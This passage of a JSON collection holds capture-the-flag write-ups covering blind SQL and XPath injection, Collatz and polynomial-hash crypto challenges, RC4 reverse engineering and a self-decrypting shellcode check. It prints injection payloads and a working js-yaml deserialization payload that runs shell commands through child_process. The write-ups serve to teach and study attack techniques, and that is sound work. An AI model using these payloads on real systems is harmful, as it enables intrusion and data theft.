WHERE type='table' AND name != 'users' LIMIT 1) > 'char'</code></li>\n<li>  The script revealed a table named: <code>secret_flags</code>.</li>\n</ul>\n3.  <strong>Finding Columns</strong>:\n<ul>\n<li>  We needed to know the column names in <code>secret_flags</code>.</li>\n<li>  We extracted the <code>CREATE TABLE</code> SQL statement for the <code>secret_flags</code> table from <code>sqlite_master</code>.</li>\n<li>  Payload logic: <code>1 AND (SELECT SUBSTR(sql, 1, 1) FROM sqlite_master WHERE type='table' AND name='secret_flags') > 'char'</code></li>\n<li>  The result was:</li>\n</ul>\n        <pre><code class=\"sql\">        CREATE TABLE secret_flags (\n            id INTEGER PRIMARY KEY,\n            flag TEXT NOT NULL\n        )\n        </code></pre>\n<ul>\n<li>  This confirmed the target column is <code>flag</code>.</li>\n</ul>\n<h3>Exploitation</h3>\n1.  <strong>Extracting the Flag</strong>:\n<ul>\n<li>  With the table <code>secret_flags</code> and column <code>flag</code> identified, we wrote a final Python script to extract the flag's content character by character.</li>\n<li>  Payload logic: <code>1 AND (SELECT SUBSTR(flag, 1, 1) FROM secret_flags LIMIT 1) > 'char'</code></li>\n<li>  The script used binary search for efficiency.</li>\n</ul>\n<h3>Result</h3>\nThe extraction script successfully recovered the flag:\n<p><strong>Flag</strong>: <code>flag{bl1nd_but_n0t_l0st_1n_th3_d4rk}</code></p>\n"
            },
            {
                "id": "peak-conjecture",
                "title": "Peak Conjecture",
                "category": "Cryptography",
                "tags": [
                    "crypto",
                    "pwn",
                    "reverse"
                ],
                "writeup": "<p>chall.py analysis:\nThe core of the challenge revolved around a function <code>uniqueHash(x)</code> which calculates the number of steps required for <code>x</code> to reach 1 according to the Collatz conjecture (3x+1 problem), with a cap of 10000 steps.</p>\n<p>The server's logic:\n1. It has a secret <code>message</code> (likely a bytes-to-long converted flag).\n2. It calculates <code>myHash = uniqueHash(message)</code>.\n3. It prints <code>uniqueHash(myHash)</code> to the user.\n4. It then asks the user to input 10 distinct integers <code>x</code> such that:\n<ul>\n<li><code>uniqueHash(x) == myHash</code></li>\n<li><code>isPrime(x) == isPrime(message)</code></li>\n</ul>\n5. If 10 such numbers are provided, it reveals <code>message</code> (the flag).</p>\n<p>Initial Interaction and Deduction:\nUpon connecting to the server using <code>nc remote.infoseciitr.in 4002</code>, the server output:\n\"This is my hash of hash: 25\"</p>\n<p>This means <code>uniqueHash(myHash) = 25</code>.\n<code>myHash</code> is itself an integer representing a number of Collatz steps. Since <code>uniqueHash(myHash) = 25</code>, it means <code>myHash</code> is an integer that takes 25 steps to reach 1 in the Collatz sequence.</p>\n<p>Strategy:\n1.  <strong>Find <code>myHash</code>:</strong> We need to find <code>S</code> such that <code>uniqueHash(S) = 25</code>. Since <code>myHash</code> is a step count, it's likely a relatively small integer (usually < 10000). We can iterate through integers <code>S</code> from 1 to 10000 and calculate <code>uniqueHash(S)</code>. The initial solver script performed this, finding a list of candidates for <code>myHash</code>. The first successful probe revealed <code>myHash = 4017</code>.\n2.  <strong>Determine <code>isPrime(message)</code>:</strong> To satisfy <code>isPrime(x) == isPrime(message)</code>, we need to know the primality of <code>message</code>. By sending a known composite number <code>x</code> (e.g., <code>2^4017</code>) that satisfies <code>uniqueHash(x) == 4017</code>, we can observe the server's response.\n<ul>\n<li>If the server says \"Correct!\", <code>isPrime(x)</code> and <code>isPrime(message)</code> are the same. Since <code>x</code> is composite, <code>message</code> is composite.</li>\n<li>If the server says \"Well Well, you failed!\", <code>isPrime(x)</code> and <code>isPrime(message)</code> are different. Since <code>x</code> is composite, <code>message</code> is prime.</li>\n</ul>\n    My solver found <code>myHash = 4017</code> and determined that <code>message</code> is prime.\n3.  <strong>Generate 10 inputs:</strong> We need to find 10 distinct prime numbers <code>x</code> such that <code>uniqueHash(x) == 4017</code>.\n    To do this, we can reverse the Collatz sequence from 1 for <code>4017</code> steps. The reverse operations are:\n<ul>\n<li><code>v -> 2 * v</code> (always valid)</li>\n<li><code>v -> (v - 1) / 3</code> (valid if <code>(v - 1)</code> is divisible by 3 and <code>(v - 1) / 3</code> is odd and greater than 1).</li>\n</ul>\n    Since <code>4017</code> steps is a large number, the resulting <code>x</code> values will be very large (thousands of bits long). The density of primes among such large numbers is low (approximately <code>1 / ln(N)</code>). Therefore, we need to generate a large number of candidates and test their primality.</p>\n<p>Solver Implementation:\nMy Python solver script used the <code>pwn</code> library for network interaction and <code>Crypto.Util.number.isPrime</code> for primality testing.</p>\n<p>The key steps in the solver were:\n<ul>\n<li>  <strong><code>uniqueHash(x)</code> function:</strong> A local re-implementation of the server's Collatz hash function.</li>\n<li>  <strong><code>generate_inputs(target_steps, beam_width, forbidden)</code> function:</strong> This function generates numbers that have a specific <code>target_steps</code> in their Collatz sequence. It works by starting from 1 and reversing the Collatz operations for <code>target_steps</code> iterations. To handle the exponential growth, it uses a <code>beam_width</code> to limit the number of active paths at each step, taking a random sample if the paths exceed the beam width.</li>\n<li>  <strong>Pre-calculation of primes:</strong> To avoid server timeouts, the solver first generated <code>myHash</code> (4017) and <code>isPrime(message)</code> (True). Then, it locally generated a large set of candidates using <code>generate_inputs(4017, 60000, [])</code>. From these candidates, it filtered out and stored 10 distinct prime numbers.</li>\n<li>  <strong>Server Interaction:</strong> After pre-calculating the primes, the solver connected to the remote server, read the initial prompt, and then sent the 10 pre-calculated primes one by one. The server responded with \"Correct!\" for each valid input.</li>\n<li>  <strong>Flag Retrieval:</strong> After the 10th correct input, the server printed the flag.</li>\n</ul>\nChallenges and Refinements:\n<ul>\n<li>  <strong><code>Cryptodome</code> vs <code>Crypto</code>:</strong> The <code>chall.py</code> used <code>Cryptodome.Util.number.isPrime</code>, while <code>pycryptodome</code> typically installs as <code>Crypto</code>. This was fixed by changing the import in the solver.</li>\n<li>  <strong>Server Timeout:</strong> The server seemed to have an idle timeout or processing timeout. Initially, my solver performed the <code>myHash</code> and primality probing, and then the prime generation *after* connecting to the server. This often led to an <code>EOFError</code> because the generation took too long. The solution was to perform all computationally intensive tasks (like generating prime candidates) locally *before* establishing the connection to the remote server.</li>\n<li>  <strong>Generating Enough Primes:</strong> Finding 10 primes with a specific, large Collatz stopping time requires exploring a wide range of numbers. Initially, my <code>beam_width</code> for candidate generation was too small, yielding fewer than 10 primes. Increasing the <code>beam_width</code> (e.g., to 60000) allowed the generator to produce enough candidates to find the required 10 primes.</li>\n</ul>\nFlag:\n<code>flag{1r0n_m4n_f0r_c0ll4tz_3ndg4m3_0f_cryp70gr4phy_1s_p34k_r16h7_313}</code></p>\n"
            },
            {
                "id": "the-job",
                "title": "The Job",
                "category": "Cryptography",
                "tags": [
                    "pwn",
                    "reverse"
                ],
                "writeup": "<p>Phase 1: Balancing the Initial Hash Table\n1.  Understanding the Requirement: The server provided 896 unique numbers and expected a polynomial $P(x)$ whose coefficients we would provide. The hash function was $H(x) = P(x) \\pmod{10^9+7}$. This hash was used to place numbers into 256 slots. The manager demanded that the inputs be \"equally divided,\" meaning the difference in sizes of any two slots should not be 2 or more.\n2.  Determining the Target Distribution: With $N=896$ numbers and $K=256$ slots, the average number of items per slot is $896/256 = 3.5$. To satisfy the \"difference in sizes of any two slots should not be 2 or more\" constraint and the maximum size limit of 4 items per slot (derived from <code>(N+K-1)/K</code> check), the only valid distribution is to have exactly 128 slots containing 3 items and 128 slots containing 4 items.\n3.  Polynomial Construction (Lagrange Interpolation): We needed to find a polynomial $P(x)$ such that for each given number $x_i$ from the leaked <code>number_array</code>, $P(x_i) \\pmod{MOD}$ resulted in a specific target slot index $y_i$. We constructed a mapping where 128 input numbers were assigned to each of the 128 \"size 4\" slots, and 128 input numbers were assigned to each of the 128 \"size 3\" slots. We then used Lagrange Interpolation over a finite field ($MOD = 10^9+7$) to determine the coefficients of this polynomial. The polynomial's degree was $N-1$, which was acceptable. The <code>solve_poly</code> function implemented this, returning the coefficients in a low-to-high degree order, which were then reversed before sending.</p>\n<p>Phase 2: Finding the Hidden Junk Value\n1.  The Twist: After Phase 1, the server revealed that a \"junk\" value was already placed in a random, unknown slot (<code>target</code>). This meant one slot would start with 1 item, and the others with 0. We had 6 trials to find this <code>target</code> index.\n2.  Trial Mechanism: In each trial, we submitted a new polynomial. The server would then check if the hash table, *including the junk value*, was balanced (i.e., no slot had more than 4 items).\n<ul>\n<li>  If the <code>target</code> slot (which already had 1 junk item) received 4 additional items from our polynomial, its total count would be 5, causing the server to report \"failed.\"</li>\n<li>  If the <code>target</code> slot received 3 additional items from our polynomial, its total count would be 4, causing the server to report \"passed.\"</li>\n</ul>\n3.  Binary Search Strategy: This provided a binary (Pass/Fail) signal. With 256 possible <code>target</code> indices and 6 trials, we could narrow down the possibilities significantly.\n<ul>\n<li>  We maintained a <code>candidates</code> list, initially containing all 256 indices.</li>\n<li>  In each trial, we split the <code>candidates</code> list into two halves: <code>test_group</code> and <code>rest_group</code>.</li>\n<li>  We then constructed a polynomial that assigned 4 items to all slots in the <code>test_group</code> (and padded this group with \"safe\" indices from previous trials to ensure exactly 128 \"size-4\" slots). The remaining slots were assigned 3 items.</li>\n<li>  If the server reported \"failed,\" the <code>target</code> was in our <code>test_group</code>.</li>\n<li>  If the server reported \"passed,\" the <code>target</code> was in our <code>rest_group</code>.</li>\n<li>  This effectively halved the <code>candidates</code> list in each trial: $256 \\to 128 \\to 64 \\to 32 \\to 16 \\to 8 \\to 4$.</li>\n</ul>\n4.  Final Guess: After 6 trials, we were left with 4 candidate indices. Since we had no further information, we simply guessed the first index in the remaining <code>candidates</code> list. This gave us a 1/4 (25%) chance of success for each connection attempt.\n5.  Automation and Retries: The entire process was wrapped in a <code>while True</code> loop to automatically reconnect and retry the challenge until the correct index was guessed and the flag was obtained.</p>\n<p>Execution:\nThe Python script <code>solve.py</code> was executed. It connected to the remote instance, performed the polynomial calculations and interactions for Phase 1 and 2, and eventually succeeded in guessing the correct index.</p>\n<pre><code class=\"python\">from pwn import *\nimport sys\nimport time\nimport traceback\n<p>&lt;h2&gt;Set context&lt;/h2&gt;\ncontext.log_level = 'info'</p>\n<p>MOD = 10**9 + 7\nN = 896\nK = 256</p>\n<p>def solve_poly(inputs, targets):\n    n = len(inputs)\n    # 1. Compute M(x) = product(x - inputs[i])\n    M = [1] \n    for x in inputs:\n        c = (MOD - x) % MOD\n        new_M = [0] * (len(M) + 1)\n        for i in range(len(M)):\n            new_M[i] = (new_M[i] + M[i] * c) % MOD\n            new_M[i+1] = (new_M[i+1] + M[i]) % MOD\n        M = new_M</p>\n<p>M_deriv = []\n    for i in range(1, len(M)):\n        M_deriv.append((M[i] * i) % MOD)</p>\n<p>w = []\n    for x in inputs:\n        val = 0\n        power_x = 1\n        for c in M_deriv:\n            val = (val + c * power_x) % MOD\n            power_x = (power_x * x) % MOD\n        w.append(val)</p>\n<p>inv_w = [pow(val, MOD-2, MOD) for val in w]</p>\n<p>final_poly = [0] * n</p>\n<p>for j in range(n):\n        target = targets[j]\n        if target == 0: continue # Optimization</p>\n<p>scale = (target * inv_w[j]) % MOD\n        if scale == 0: continue</p>\n<p>c = inputs[j]\n        carry = 0 \n        for k in range(n, 0, -1):\n             val = (M[k] + c * carry) % MOD\n             carry = val\n             final_poly[k-1] = (final_poly[k-1] + val * scale) % MOD</p>\n<p>return final_poly</p>\n<p>def main():\n    while True:\n        try:\n            # Connect\n            log.info(\"Connecting...\")\n            r = remote('remote.infoseciitr.in', 4006)</p>\n<p># Read intro\n            r.recvuntil(b\"Press Enter to start &gt; \")\n            r.sendline(b\"\")</p>\n<p># Read leaked numbers\n            r.recvuntil(b\"Here are the leaked numbers : \")\n            nums_str = r.recvline().strip().decode()\n            number_array = list(map(int, nums_str.split(',')))</p>\n<p>log.info(f\"Received {len(number_array)} numbers\")</p>\n<p># Phase 1: Provide balanced hash\n            targets = []\n            slot_counts = [0] * K\n            for i in range(N):\n                if i &lt; 512:\n                    slot = i // 4\n                else:\n                    rem = i - 512\n                    slot = 128 + (rem // 3)\n                targets.append(slot)\n                slot_counts[slot] += 1</p>\n<p>log.info(\"Computing Phase 1 polynomial...\")\n            coeffs = solve_poly(number_array, targets)\n            payload = \",\".join(map(str, coeffs[::-1]))</p>\n<p>r.sendlineafter(b\"&gt; \", payload.encode())</p>\n<p>ret = r.recvuntil(b\"Press Enter to continue &gt; \", timeout=10)\n            if b\"Press Enter\" not in ret:\n                log.error(\"Phase 1 failed or timed out\")\n                log.error(ret.decode())\n                r.close()\n                continue</p>\n<p>log.info(\"Phase 1 success.\")\n            r.sendline(b\"\")</p>\n<p># Phase 2: Find the index\n            candidates = list(range(K))\n            safe_indices = []</p>\n<p>for trial in range(6):\n                log.info(f\"Trial {trial+1}, Candidates: {len(candidates)}\")</p>\n<p>mid = len(candidates) // 2\n                test_group = candidates[:mid]\n                rest_group = candidates[mid:]</p>\n<p>needed = 128 - len(test_group)\n                if needed &lt; 0: needed = 0\n                padding = safe_indices[:needed]</p>\n<p>slots_for_4 = set(test_group + padding)\n                # Ensure we have exactly 128\n                if len(slots_for_4) != 128:\n                    log.warning(f\"Slots for 4 count: {len(slots_for_4)}. Candidates: {len(candidates)}\")</p>\n<p>current_slot_counts = {}\n                for s in range(K):\n                    if s in slots_for_4:\n                        current_slot_counts[s] = 4\n                    else:\n                        current_slot_counts[s] = 3</p>\n<p>target_slots_list = []\n                for s in range(K):\n                    count = current_slot_counts[s]\n                    for _ in range(count):\n                        target_slots_list.append(s)</p>\n<p>log.info(\"Computing Phase 2 polynomial...\")\n                coeffs = solve_poly(number_array, target_slots_list)\n                payload = \",\".join(map(str, coeffs[::-1]))</p>\n<p>r.sendlineafter(b\"&gt; \", payload.encode())</p>\n<p>response = r.recvuntil(b\"\\n\\n\").decode()</p>\n<p>if \"passed\" in response:\n                    candidates = rest_group\n                    safe_indices.extend(test_group)\n                else:\n                    candidates = test_group\n                    safe_indices.extend(rest_group)</p>\n<p>log.info(f\"Candidates left: {candidates}\")\n            guess = candidates[0]\n            log.info(f\"Guessing: {guess}\")</p>\n<p>r.sendlineafter(b\"Tell your friend the index : \", str(guess).encode())</p>\n<p>final_res = r.recvall(timeout=5).decode()\n            print(final_res)</p>\n<p>if \"flag\" in final_res.lower() or \"Flag\" in final_res or \"{\" in final_res:\n                print(\"FOUND FLAG!\")\n                break\n            else:\n                log.info(\"Failed, retrying...\")\n                r.close()</p>\n<p>except BaseException as e:\n            print(f\"CRITICAL ERROR: {e}\")\n            traceback.print_exc()\n            try: r.close()\n            except: pass\n            time.sleep(1)</p>\n<p>if __name__ == \"__main__\":\n    main()\n</code></pre></p>\n<p>Flag: <code>flag{h0w_d1d_h3_b3c0m3_th3_m4n4g3r}</code></p>\n"
            },
            {
                "id": "to_jmp_or_not_jmp",
                "title": "To_jmp_or_not_jmp",
                "category": "Reverse Engineering",
                "tags": [
                    "cipher",
                    "xor",
                    "buffer",
                    "reverse",
                    "assembly",
                    "disassembler",
                    "memory"
                ],
                "writeup": "<h3>1. Challenge Overview</h3>\n<p>The challenge presented a stripped 64-bit ELF executable named <code>challenge</code>. When executed, it prompted for a \"flag\" and responded with \"Wrong! Try again.\" if an incorrect input was provided. The goal was to find the correct flag.</p>\n<h3>2. Initial Analysis</h3>\n<ul>\n<li>  <strong>File Type:</strong></li>\n</ul>\n    <pre><code class=\"bash\">    ls -la &amp;&amp; file challenge\n    </code></pre>\n    Output confirmed it was an <code>ELF 64-bit LSB pie executable, x86-64, stripped</code>. The \"stripped\" nature meant function names were removed, increasing the difficulty of static analysis. \"PIE\" (Position-Independent Executable) indicated that addresses would be relative, requiring careful RIP-relative address calculations.\n<ul>\n<li>  <strong>Execution:</strong></li>\n</ul>\n    <pre><code class=\"bash\">    ./challenge\n    </code></pre>\n    Output:\n    <pre><code class=\"\">    Enter the flag: 12345\n    Wrong! Try again.\n    </code></pre>\n    This confirmed the program's basic interaction.\n<ul>\n<li>  <strong>Strings Analysis:</strong></li>\n</ul>\n    <pre><code class=\"bash\">    strings challenge | grep -i flag\n    </code></pre>\n    Output:\n    <pre><code class=\"\">    Enter the flag:\n    Correct! You got the flag!\n    </code></pre>\n    The presence of \"Correct! You got the flag!\" suggested a comparison logic within the binary that we needed to locate and understand.\n<h3>3. Reverse Engineering - Control Flow Obfuscation</h3>\n<p>The primary challenge in static analysis was the presence of control flow obfuscation using a pattern of <code>je</code> (jump if equal) and <code>jne</code> (jump if not equal) instructions targeting the same address. This effectively created an unconditional jump but confused disassemblers and made linear analysis difficult. For example:</p>\n<pre><code class=\"assembly\">    16a9:       74 03                   je     16ae\n    16ab:       75 01                   jne    16ae\n</code></pre>\nBoth instructions would jump to <code>16ae</code>, making <code>16ae</code> the actual next instruction. This pattern required careful manual tracing of the control flow.\n<p>The binary also used dynamic jump targets:\n1.  An address (e.g., <code>0x11c9</code>) was calculated using <code>lea rax, [rip + offset]</code>.\n2.  This address was then stored in a global memory location (e.g., <code>mov QWORD PTR [rip+offset], rax</code>).\n3.  Later, the value from that global memory location was loaded into a register (<code>mov rax, QWORD PTR [rip+offset]</code>).\n4.  Finally, an indirect jump (<code>jmp rax</code>) was used to transfer execution to the calculated address. This made it difficult to follow the flow directly in <code>objdump</code> without careful calculation.</p>\n<p>After tracing the obfuscated entry point (<code>0x10e0</code>) and subsequent jumps, the effective <code>main</code> function started at <code>0x11c9</code>.</p>\n<h3>4. Identifying RC4 Algorithm</h3>\n<p>Inside the <code>main</code> function (starting at <code>0x11c9</code> after initial setup), the following sequence of operations was identified:</p>\n<ul>\n<li>  <strong>Prompt for Input:</strong> The string \"Enter the flag:\" was printed, followed by a call to <code>std::getline</code> to read user input. The length of the input was stored in a global variable at <code>0x44a0</code>.</li>\n<li>  <strong>S-box Initialization (KSA Phase 1):</strong> A loop from <code>0</code> to <code>255</code> initialized a 256-byte array (likely the S-box for RC4) with <code>S[i] = i</code>. This array was located in the <code>.bss</code> section (uninitialized data), eventually mapped to virtual address <code>0x4280</code>.</li>\n<li>  <strong>Key Scheduling Algorithm (KSA Phase 2):</strong> A second loop (from <code>i=0</code> to <code>255</code>) performed the key-dependent scrambling of the S-box. The logic closely matched the standard RC4 KSA:</li>\n</ul>\n    <pre><code class=\"\">    j = (j + S[i] + key_byte) % 256\n    swap(S[i], S[j])\n    </code></pre>\n<ul>\n<li>  <strong>Pseudo-Random Generation Algorithm (PRGA):</strong> After the KSA, a third loop iterated for the length of the user's input. In each iteration, it generated a keystream byte and XORed it with a byte of the user's input. The standard RC4 PRGA was identified:</li>\n</ul>\n    <pre><code class=\"\">    i = (i + 1) % 256\n    j = (j + S[i]) % 256\n    swap(S[i], S[j])\n    K = S[(S[i] + S[j]) % 256]\n    encrypted_input_byte = input_byte ^ K\n    </code></pre>\n    The results of this XOR operation (the \"encrypted\" user input) were stored in a buffer at <code>0x4420</code>.\n<ul>\n<li>  <strong>Comparison:</strong> Finally, the \"encrypted\" user input (from <code>0x4420</code>) was compared byte-by-byte with a pre-stored ciphertext.</li>\n<li>  If all bytes matched, the program jumped to a block that printed \"Correct! You got the flag!\" (identified by tracing a <code>lea</code> instruction to <code>0x20a1</code> in <code>.rodata</code>).</li>\n<li>  If any byte mismatched, it jumped to a block that printed \"Wrong! Try again.\"</li>\n</ul>\nThis confirmed that the challenge involved an RC4-encrypted flag, and we needed to reverse the encryption by finding the key and the pre-stored ciphertext.\n<h3>5. Extracting RC4 Parameters</h3>\n<h4>a. Key Identification</h4>\n<ul>\n<li>  During KSA analysis, an instruction <code>lea rdx,[rip+0xccd]</code> was found, which resolved to address <code>0x2020</code>. This address was within the <code>.rodata</code> section, indicating it was a constant string.</li>\n<li>  A modulo operation <code>(i % 15)</code> was used to index into this data, suggesting a key length of 15.</li>\n<li>  Dumping 15 bytes from <code>0x2020</code> in the <code>challenge</code> binary:</li>\n</ul>\n    <pre><code class=\"bash\">    dd if=challenge bs=1 skip=$((0x2020)) count=15 2&gt;/dev/null | hexdump -C\n    </code></pre>\n    Output:\n    <pre><code class=\"\">    00000000  21 61 31 20 61 26 0d 39  61 2b 0d 20 31 66 73     |!a1 a&amp;.9a+. 1fs|\n    </code></pre>\n    The key bytes were <code>21 61 31 20 61 26 0d 39 61 2b 0d 20 31 66 73</code>. Note that <code>0d</code> is Carriage Return (<code>\\r</code>), not a period (<code>.</code>). The string representation is <code>!a1 a&\\r9a+\\r 1fs</code>.\n<h4>b. Key Modification</h4>\n<ul>\n<li>  A critical instruction <code>xor eax, 0x52</code> was discovered immediately after fetching a key byte <code>key[i % key_len]</code> and before it was added to <code>j</code> in the KSA. This meant each key byte was XORed with <code>0x52</code> during the KSA process.</li>\n</ul>\n<h4>c. Ciphertext Identification</h4>\n<ul>\n<li>  The comparison loop read from a location at <code>0x2040</code>. This address was also within <code>.rodata</code>, indicating it was the static ciphertext of the flag.</li>\n<li>  Dumping bytes from <code>0x2040</code> (initially 64 bytes, then extended to 66 when the flag revealed its full length):</li>\n</ul>\n    <pre><code class=\"bash\">    dd if=challenge bs=1 skip=$((0x2040)) count=66 2&gt;/dev/null | hexdump -C\n    </code></pre>\n    Output:\n    <pre><code class=\"\">    00000000  8f 36 cf 7d 04 8e 35 ac  0f e8 3f 53 8b 87 ac 26  |.6.}..5...?S...&amp;|\n    00000010  18 5b 13 c7 ff a6 1d 92  29 b7 62 af a9 b0 cf 74  |.[......).b....t|\n    00000020  d2 99 4e 55 47 a9 77 3b  67 28 cb 52 74 90 47 24  |..NUG.w;g(.Rt.G$|\n    00000030  15 94 e1 4e 4d f2 57 ad  7f 5d 22 17 05 08 8b 2a  |...NM.W..\"....*|\n    00000040  ed f1                                            |..              |\n    </code></pre>\n    The ciphertext bytes are <code>8f 36 cf 7d 04 8e 35 ac 0f e8 3f 53 8b 87 ac 26 18 5b 13 c7 ff a6 1d 92 29 b7 62 af a9 b0 cf 74 d2 99 4e 55 47 a9 77 3b 67 28 cb 52 74 90 47 24 15 94 e1 4e 4d f2 57 ad 7f 5d 22 17 05 08 8b 2a ed f1</code>.\n<h3>6. Decryption</h3>\n<p>A Python script <code>solve.py</code> was written to implement the RC4 algorithm with the identified key and ciphertext, including the key modification step.</p>\n<pre><code class=\"python\">def rc4_ksa(key_bytes):\n    S = list(range(256))\n    j = 0\n    key_len = len(key_bytes)\n    for i in range(256):\n        # Apply the modification found in analysis: XOR key byte with 0x52\n        modified_key_byte = key_bytes[i % key_len] ^ 0x52\n        j = (j + S[i] + modified_key_byte) % 256\n        S[i], S[j] = S[j], S[i]\n    return S\n<p>def rc4_prga(S, data_len):\n    i = 0\n    j = 0\n    keystream = []\n    # Create a copy of S for PRGA so KSA S-box is not modified\n    S_prga = list(S) \n    for _ in range(data_len):\n        i = (i + 1) % 256\n        j = (j + S_prga[i]) % 256\n        S_prga[i], S_prga[j] = S_prga[j], S_prga[i]\n        K = S_prga[(S_prga[i] + S_prga[j]) % 256]\n        keystream.append(K)\n    return keystream</p>\n<p>&lt;h2&gt;Key bytes derived from hexdump, including 0x0d for Carriage Return&lt;/h2&gt;\nkey_hex_str = \"21 61 31 20 61 26 0d 39 61 2b 0d 20 31 66 73\"\nkey_bytes = [int(b, 16) for b in key_hex_str.split()]</p>\n<p>&lt;h2&gt;Ciphertext bytes from 0x2040&lt;/h2&gt;\nciphertext_hex = \"8f 36 cf 7d 04 8e 35 ac 0f e8 3f 53 8b 87 ac 26 18 5b 13 c7 ff a6 1d 92 29 b7 62 af a9 b0 cf 74 d2 99 4e 55 47 a9 77 3b 67 28 cb 52 74 90 47 24 15 94 e1 4e 4d f2 57 ad 7f 5d 22 17 05 08 8b 2a ed f1\"\nciphertext = bytes.fromhex(ciphertext_hex.replace(\" \", \"\"))</p>\n<p>S_ksa = rc4_ksa(key_bytes)\nkeystream = rc4_prga(S_ksa, len(ciphertext))</p>\n<p>decrypted_bytes = []\nfor c, k in zip(ciphertext, keystream):\n    decrypted_bytes.append(c ^ k)</p>\n<p>print(\"Decrypted bytes:\", decrypted_bytes)\nprint(\"Decrypted string:\", bytes(decrypted_bytes))\n</code></pre></p>\n<p>Running <code>python3 solve.py</code> produced:</p>\n<pre><code class=\"\">Decrypted string: b'flag{$t0p_JUmp1n9_@R0uNd_1!k3_A_F00l_4nd_gib3_M3333_7H@t_f14g!!!!}'\n</code></pre>\n<h3>7. Verification</h3>\n<p>To verify the decrypted flag, the executable needed to be run with execute permissions. After restoring execute permissions:</p>\n<pre><code class=\"bash\">chmod +x challenge\necho 'flag{$t0p_JUmp1n9_@R0uNd_1!k3_A_F00l_4nd_gib3_M3333_7H@t_f14g!!!!}' | ./challenge\n</code></pre>\n<p>Output:\n<pre><code class=\"\">Enter the flag: Correct! You got the flag!\n</code></pre></p>\n<p>This confirmed the flag was correctly identified.</p>\n<h3>Flag</h3>\n<p><code>flag{$t0p_JUmp1n9_@R0uNd_1!k3_A_F00l_4nd_gib3_M3333_7H@t_f14g!!!!}</code></p>\n<p>```</p>\n"
            },
            {
                "id": "trust-issues",
                "title": "Trust Issues",
                "category": "Web Exploitation",
                "tags": [
                    "injection"
                ],
                "writeup": "<p>1.  <strong>Blind XPath Injection (Timing Attack):</strong>\n    The <code>login</code> endpoint was vulnerable to XPath injection via the <code>username</code> field. The application performed a <code>setTimeout(..., 2000)</code> if a user was found, creating a timing oracle. By injecting XPath queries, we could ask true/false questions about the database content based on the response time.\n<ul>\n<li>  <strong>Vulnerable Code:</strong></li>\n</ul>\n        <pre><code class=\"javascript\">        const query = <code>//user[username/text()='${username}']</code>;\n        const userNode = xpath.select(query, xmlDoc)[0];\n        if (userNode) { await new Promise(resolve =&gt; setTimeout(resolve, 2000)); }\n        </code></pre>\n<ul>\n<li>  <strong>Exploit:</strong> We used a script to iterate through characters of the admin's password using the payload <code>admin' and substring(password, N, 1)='C</code>. This allowed us to extract the admin password: <code>df08cf</code>.</li>\n</ul>\n2.  <strong>Remote Code Execution (RCE) via YAML Deserialization:</strong>\n    With the admin credentials, we accessed the <code>/admin/create</code> endpoint. This endpoint accepted YAML content and parsed it using an outdated and vulnerable version of <code>js-yaml</code> (v2.0.4).\n<ul>\n<li>  <strong>Vulnerable Code:</strong></li>\n</ul>\n        <pre><code class=\"javascript\">        parsed = yaml.load(fileContent);\n        const applied = '' + parsed; \n        </code></pre>\n<ul>\n<li>  <strong>Exploit:</strong> We constructed a malicious YAML payload using the <code>!!js/function</code> tag, which allows execution of arbitrary JavaScript code during parsing in this version of <code>js-yaml</code>. We used an IIFE (Immediately Invoked Function Expression) to run system commands. Since <code>require</code> is not available in the global scope of <code>new Function</code>, we accessed it via <code>process.mainModule.require</code>.</li>\n</ul>\n    <strong>Payload:</strong>\n    <pre><code class=\"yaml\">    !!js/function \"function() { var req = process.mainModule.require; var res = req('child_process').execSync('cat flag.txt').toString(); return res; }()\"\n    </code></pre></p>\n<p><strong>Flag:</strong>\n<code>flag{xPath_to_YamLrc3_ecddd907d5d5decb}</code></p>\n"
            },
            {
                "id": "vault",
                "title": "Vault",
                "category": "Reverse Engineering",
                "tags": [
                    "xor",
                    "shellcode",
                    "assembly",
                    "memory"
                ],
                "writeup": "<p>The challenge presented a stripped 64-bit ELF executable named <code>chal</code>.\nUpon execution, it prompted for a password:</p>\n<pre><code class=\"\">I heard that you got some crazy vault breaking skills\n<p>Try to break this one</p>\n<p>Enter the password:\n</code></pre></p>\n<p>Initial attempts with arbitrary input resulted in:</p>\n<pre><code class=\"\">L00ks like you got some real skill issue.\nBetter luck next time.\n</code></pre>\n<p>Analysis using <code>objdump -d chal</code> and <code>readelf -S chal</code> revealed the following:</p>\n<p>1.  <strong>Password Length:</strong> The <code>main</code> function (at <code>0x1460</code>) used <code>scanf</code> to read input and then checked its length using <code>strcspn</code>. It compared the length against <code>0x35</code> (decimal 53). If the length was not 53, it printed the \"skill issue\" message and exited. This established the password length as 53 characters.</p>\n<p>2.  <strong>Dynamic Code Generation (JIT):</strong>\n    The core validation logic was found in a function called by <code>main</code> (at <code>0x1379</code>). This function iterated 53 times (once for each character of the password). In each iteration, it performed the following:\n<ul>\n<li>  It called another function (at <code>0x1249</code>) to dynamically generate a small piece of executable code (shellcode).</li>\n<li>  This dynamically generated shellcode was then executed to validate the current character of the password.</li>\n<li>  The address of the generated shellcode (in a memory-mapped executable region) was passed via <code>%r9</code>.</li>\n</ul>\n3.  <strong>Shellcode Generation Logic (Function at <code>0x1249</code>):</strong>\n    This function was responsible for \"decrypting\" the validation logic for each password character.\n<ul>\n<li>  It allocated a 56-byte executable memory region using <code>mmap</code>.</li>\n<li>  It iterated 56 times, reading an encrypted byte <code>B</code> from a <code>data</code> section (<code>0x4020 + 57 * i + j</code>).</li>\n<li>  It XORed <code>B</code> with a 4-byte key <code>K</code> (read from <code>0x4c00 + i * 4</code>). Specifically, it used the lowest byte of the XOR operation <code>(B ^ K) & 0xFF</code> to reconstruct the shellcode byte. This means <code>K</code> was effectively used as a single-byte XOR key for decryption, repeating for each byte of the shellcode.</li>\n<li>  The decrypted bytes formed the actual machine code for the character's validation function.</li>\n</ul>\n4.  <strong>Shellcode Validation Logic:</strong>\n    Disassembly of the generated shellcode (e.g., <code>func_0.bin</code>) revealed a consistent structure:\n<ul>\n<li>  <code>mov $SHIFT, %ecx</code>: The first instruction loaded a varying <code>SHIFT</code> value into <code>%ecx</code>. This <code>SHIFT</code> determined the starting bit position for validation.</li>\n<li>  <code>xor %rsi, %rdi</code>: The input character (<code>%rdi</code>) was XORed with the full 4-byte key (<code>%rsi</code>, passed from the main loop, which was <code>K</code>). Let <code>Y = input_char ^ K</code>.</li>\n<li>  A loop then iterated 8 times (for bits 0-7). In each iteration <code>k</code> (0 to 7):</li>\n<li>  It extracted a specific bit from <code>Y</code>: <code>bit = (Y >> ((SHIFT + k) % 8)) & 1</code>.</li>\n<li>  This <code>bit</code> was compared against an <code>expected_bit</code> value. The <code>expected_bit</code> was read from a 